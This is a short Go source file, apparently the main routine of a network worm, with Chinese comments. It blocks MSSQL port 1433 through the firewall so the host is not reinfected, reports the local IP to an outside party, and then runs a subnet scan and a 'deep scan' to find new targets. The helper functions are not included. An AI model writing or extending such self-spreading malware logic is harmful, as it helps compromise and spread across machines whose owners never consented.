package main

func main() {
	CloseMssql()         // 防火墙屏蔽1433通信，防止二次感染。
	_str := GetLocalIp() // 获取本机IP
	SendInfo(_str)
	// 子网扫描
	SNscan()
	// 深度扫描
	MakeIp()
}
